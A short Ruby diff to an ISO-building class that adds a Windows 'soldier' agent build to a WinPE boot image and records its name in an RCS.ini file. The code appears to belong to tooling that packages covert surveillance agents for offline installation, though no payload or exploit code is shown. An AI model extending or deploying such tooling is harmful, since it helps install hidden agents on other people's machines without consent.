@@ -27,6 +27,7 @@ class BuildISO < Build
 
     names = {}
     funcnames = []
+    soldier_name = ""
 
     params['platforms'].each do |platform|
       build = Build.factory(platform.to_sym)
@@ -55,6 +56,13 @@ class BuildISO < Build
         FileUtils.cp(File.join(build.tmpdir, v), path("winpe/RCSPE/files/#{platform.upcase}/" + v))
       end
 
+      if platform == 'windows'
+        build.melt({'soldier' => true, 'scout' => false})
+        FileUtils.mkdir_p(path("winpe/RCSPE/files/#{platform.upcase}/SOLDIER"))
+        FileUtils.cp(File.join(build.tmpdir, 'output'), path("winpe/RCSPE/files/#{platform.upcase}/SOLDIER/soldier"))
+        soldier_name = build.soldier_name(@factory.confkey)[:name]
+      end
+
       build.clean
     end
 
@@ -71,7 +79,7 @@ class BuildISO < Build
     # write the ini file
     File.open(path('winpe/RCSPE/RCS.ini'), 'w') do |f|
       f.puts "[RCS]"
-      f.puts "VERSION=#{File.read(Dir.pwd + '/config/VERSION')}"
+      f.puts "VERSION=#{File.read(Config.instance.file('VERSION'))}"
       f.puts "HUID=#{@factory.ident}"
       f.puts "HCORE=#{names[:core]}"
       f.puts "HCONF=#{names[:config]}"
@@ -93,6 +101,7 @@ class BuildISO < Build
       f.puts "HKEY=#{key}"
       f.puts "FUNC=" + funcnames[8]
       f.puts "MASK=#{params['dump_mask']}"
+      f.puts "SOLD=#{soldier_name}"
     end
 
   end
